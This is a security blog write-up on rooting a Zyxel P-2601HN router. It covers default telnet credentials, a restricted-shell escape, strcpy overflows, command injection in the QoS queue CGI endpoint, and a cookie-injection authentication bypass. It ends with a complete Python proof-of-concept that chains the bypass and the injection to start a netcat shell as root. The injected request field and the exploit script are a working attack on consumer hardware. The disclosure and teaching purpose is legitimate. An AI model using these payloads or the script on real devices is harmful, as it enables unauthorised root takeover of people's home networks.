---
title: "Lan To Root - Zyxel"
date: 2023-04-04T20:04:41+02:00
---
# Preface
A few of the 0DRG members met on a quite sunday and took a crack at hacking a Zyxel P-2601HN. 
Most of this post will be reposted from a members blog over [here](https://cavefxa.com/posts/zyxel-p2601hn/).

# Getting started
Picking a target wasn't too hard, the target had to be soft enough to be pwnable in a day.
Cave had an old Zyxel router laying around, and that seemed as good a target as any.

### Initial reconnaisance
First things first, we had to crack the code to get into the web interface. After some sleuthing on the interwebs, we found the manual that claimed the default username and password was `admin:1234`.
Well, we tried it and - surprise, surprise - it didn't worked after a reset. A lovely user interface appeared, complete with a stunning network diagram.
And because we're thorough, we ran the obligatory `nmap` scan. Lo and behold, we discovered the router had telnet open! Can you believe it? We were practically giddy with excitement. Without a second thought, we entered the default admin creds (`admin:1234`) and BOOM - we were in! Well, kind of. It was a custom restricted shell, but hey, we'll take it!

### Breaking free
Now we were in a `ZySH>` terminal, which was very restricted. We tried `help` etc. but nothing seemed to do what we expected. After trying a few things, we saw that `h` gave the history of our commands, and following in this train of thought, we tried a bunch of other one letter commands. Most letters gave a message along the lines of `Command doesn't exist` while two letters gave another message along the lines of `Please specify the option`. During this Cave ended up finding that if you just send `n s`, you get a proper busybox shell. This was more a stroke of luck, than anything else, but now we have a proper shell!

# Now what?
### Extracting binaries for reversing
We stumbled upon the webroot folder and noticed all the `.cgi` files present. In our case, the `cgi` files were all compiled executables. This means a _lot_ of juicy attack surface.

Now let's take a bit of a sidetrack, and try to understand properly how a .cgi file works. [CGI][0] stands for Common Gateway Interface, and is an interface, which allows executing external programs, typically to process user requests. That is, if we send a GET or POST request to a server, it might call some CGI binary, which processes our request, and for example, might determine if we're admin or not. This is pretty neat, and all, but how does it pass the request parameters to these external programs? For a GET request, the parameters (often sent in the URL i.e. `http://URL:PORT/example.cgi?favorite_word=deadbeef&has_been_called=1`), will be passed through the `QUERY_STRING`, environment variable. There's also the `PATH_INFO` variable, which contains info about what URL has been referred. A program might then create files on the system, access a local database, external database or use this information, how it sees fit. For example a registering feature in a CGI context, might take your username and password, and then add them to a database.

# Finding bugs everywhere
### Using what we've learnt
Now we began analyzing these CGI binaries. We started by noting that they were `ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped`. So we were dealing with 32-bit big endian executables written in C. Cave wrote a small bash script to extract functions from the different CGI binaries, as there were many.
```bash
#!/bin/bash

# Store directory of .cgi files
DIR=$1

# Create output file "results.txt"
touch results.txt

# Run rabin2 command on each .cgi file in the directory 
for file in $DIR/*.cgi; do
	echo "File: $file" >> results.txt
	rabin2 -i $file >> results.txt
	echo -e "\n\n" >> results.txt
done
```
Quickly we see a lot of interesting files, let's take an example:
```

File: ./wlan_wpsinfo.cgi
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
3   0x00400ce0 WEAK   FUNC       __deregister_frame_info
6   0x00400cf0 GLOBAL FUNC       getenv
8   0x00400d00 GLOBAL FUNC       system
9   0x00400d10 GLOBAL FUNC       templateSetFile
10  0x00000000 WEAK   NOTYPE     _Jv_RegisterClasses
11  0x00400d20 GLOBAL FUNC       sleep
15  0x00400d30 WEAK   FUNC       __register_frame_info
19  0x00400d40 GLOBAL FUNC       __uClibc_main
20  0x00400d50 GLOBAL FUNC       templatePrint
22  0x00400d60 GLOBAL FUNC       access
25  0x00400d70 GLOBAL FUNC       templateFreeMem
```
This file uses `getenv`, which means we might be able to interact with it through a request we send, and furthermore it also calls the dangerous `system` method, which might allow for executing commands on the underlying system. Let's take a look at one of the binaries using this `getenv` functionality. We can look at the `wpsinfo` from the example above.
```c
int32_t cgiMain() {
    int32_t var_110 = 0
    checkTimeOut()
    char stack_buffer 
    if (getenv("QUERY_STRING") != 0)
        strcpy(&stack_buffer, getenv("QUERY_STRING"))
        ... }
```
We can see we have a direct overflow here, this is due to the fact that `strcpy` does no bounds checking. Recall the sidetrack from before, we have control over the QUERY_STRING, if we send a GET request to this endpoint. This is one of many vulnerabilities of this type. Running `checksec` to check security mitigations on the binary we're happy to see, that there are none.
```
Arch:     mips-32-big
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
We could perhaps use this for a buffer overflow, and then do return-oriented programming on the router, and run code like this. But it is time consuming to develop a memory corruption exploit for an architecture that none of us were too familiar with. So we opted to leave the buffer overflows for the moment.

### Looking further, command injection
There's so much wrong with this code, so we continued to search for a more reliably exploitable bug. If it used `system`, we might be lucky to get a straight up command injection. After some time investigating these files, we see that we have the following interesting code:
```c
# qos_queue.cgi

templateSetVar("QueueNumber", &qname)
templateSetVar("EnableNumber", &qname)
templateSetVar("WebQueueNumber", &qname)
void* const var_10_1
if (zx.d($v0_27[2].b) == 0)
    var_10_1 = &data_403314
else
    var_10_1 = &data_403310
templateSetVar("activechk", var_10_1)
if (var_1ac_1 == 1)
    templateSetVar("DefaultCheckDisable", "disabled="true"")
strcpy(&qname, $v0_27 + 0x11a)
templateSetVar("QName", &qname)
strcpy(&qname, $v0_27 + 0xd)
void command
sprintf(&command, "echo Interface is %s >> /var/web…", &qname)
system(&command)
...
```
We see that we're using the `sprintf` command here, to read into `command` and then we run system, with this command. If we can control the `qname` here we've won. We can read the `/var/webqos.txt`, and see that whenever we send a request to `qos_queue.cgi`. Another line gets added to the webqos.txt file. Specifically the text `WAN`. Playing around with the ZyXEL portal interface, we found out that we could go to Network Setting > QoS > Queue Setup, intercepting this request we see:
```
POST /qos_queue_add.cgi HTTP/1.1 
Host: 192.168.1.1 
Content-Length: 159 
Cache-Control: no-cache 
Pragma: no-cache 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: text/html, */* 
X-Requested-With: XMLHttpRequest 
If-Modified-Since: 0 
Expires: 0 
Origin: http://192.168.1.1 
Referer: http://192.168.1.1/indexMain.cgi 
Accept-Encoding: gzip, deflate 
Accept-Language: en-US,en;q=0.9 
Cookie: session=192.168.1.44 
Connection: close

Submit=Apply&WebQueueActiveCfg=Active&QueueObjectIndex=1&
QueueNameTxt=WAN_Default_Queue&WebQueueInterface=WAN&
WebQueuePriority=3&WebQueueWeight=1&WebQueueRate=
```
We can see that the thing that matches our log file is sent in this request `WAN`. We try changing this to `AAAAAAAA`, reading the log file reveals... Success! Let's send another request with:
`WebQueueInterface=WAN;echo+'helloworld'+>>+/tmp/helloworld;`
We see that we have succesfully created a new file, we now have RCE. 

### Getting a reverse shell
Now we need to replace this with a proper reverse shell. This is really simple, and is just a simple `nc` command. We could use `nc -l -p 1337 -e 'sh'`, and then connect to the server on port 1337, and boom we're in. Now we just need to privilege escalate to root, and bypass authentication! Or...
```
$ whoami
root
```
Well, seems like we're already root. Well.. Damn.. This exploit is authenticated however, meaning that if a user had changed the username and/or password, our exploit would not run.
Still having a few hours left of the day, and feeling fairly confident about there being plenty of low hanging fruit, we decided to go for an auth bypass as well.

### RevShell v2.0, added authentication bypass!
Looking for which server is responsible for authentication we found that there was a service running called `mini_httpd`, which was responsible for directing traffic to CGI binaries. In this binary there was code for checking whether a user was authenticated:
```c
void ip_addr
if (var_e40 != 0)
    int32_t stream = fopen(&stream#-1, "r+") // Filename is based on requesters cookie
    if (stream == 0)
        var_e4c = 0                          // The file does not exist, this is a new session
        int32_t open_tmp_file = fopen(&stream#-1, "w")
        if (open_tmp_file != 0)
            _fprintf(open_tmp_file, "0 %s NULL %d ", &session_cookie, 1, auth) // Write new session data
            _fclose(open_tmp_file)
    else
        void authorization                  // The file was found, there already was a session
        auth = &authorization
        int32_t num
        if (_fscanf(stream, "%d %s %s ", &num, &ip_addr, auth) s< 3)    // Scan the file for fields
            var_e4c = 1
            _fclose(stream)                     // File has the wrong format, bail
            _unlink(&stream#-1)           
        else
            int32_t var_bf4
            _sysinfo(&var_bf4)
            if (_strcmp(request_ip, &ip_addr) != 0)   // Check that the ip matches request IP
                _memcpy(&authorization, "NULL", 5)
                var_e4c = 0
                sub_401f10(stream)
                auth = &authorization
                var_eac = 1
                _fprintf(stream, "%d %s %s %d ", var_bf4, &ip_addr, auth, 1)
                _fclose(stream)
            else
                if (_strcmp(&authorization, "admin") != 0)
                    if (_strcmp(&authorization, "user") == 0)
```
This is some fairly odd session handling code. The cookie that the user uses is their ip, which is easily bruteforced.
It tries to open a file using the content of the cookie as the filename (yes this is also a path traversal), then writes that same value into it as the IP.
Because of the way it does this, we can inject fields into the session file. The format is:
```
[login attempts] [user controlled value (ip)] [username] [something else]
```
If we inject spaces into our cookie, we can inject fields into this, with a cookie like this:
```
192.168.1.5 admin 0 
```
it will be written into the file like:
```
0 192.168.1.5 admin 0 NULL 0
```
When it is later read back out on a second request, we will have injected the admin username leading to the authentication bypass.
### Exploit plan
1. Create a request, to create this file (with malicious session)
2. Send a POST request with our payload, and the malicious session
3. It will now parse the fake `admin` we inserted, logging us in
4. The post request will contain the reverse shell
5. ???
6. GG

# Final Proof-of-Concept script
```python
from pwn import *
import urllib.parse
import requests
import sys

host_ip = sys.argv[1]

r=requests.get("http://192.168.1.1/qos_queue_add.cgi", cookies={"session":f"{host_ip} admin 0"})
print(r.text)
io = remote("192.168.1.1", 80)

query = "nc -l -p 1337 -e 'sh'"

query_url_enc = urllib.parse.quote(query)

req = f"""POST /qos_queue_add.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 159
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html, /
X-Requested-With: XMLHttpRequest
If-Modified-Since: 0
Expires: 0
Origin: http://192.168.1.1/
Referer: http://192.168.1.1/indexMain.cgi
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session={host_ip} admin 0
Connection: close

Submit=Apply&WebQueueActiveCfg=Active&QueueObjectIndex=1&QueueNameTxt=WAN_Default_Queue&WebQueueInterface=WAN;{query_url_enc};&WebQueuePriority=3&WebQueueWeight=1&WebQueueRate=""".encode()

print(req)

io.send(req)
io.close()

sleep(1)

io2 = remote("192.168.1.1", 1337)
io2.interactive()
```

It was a fun sunday, with an interesting bug in the authentication code.
# References
\[0\]: https://en.wikipedia.org/wiki/Common_Gateway_Interface

[0]: https://en.wikipedia.org/wiki/Common_Gateway_Interface
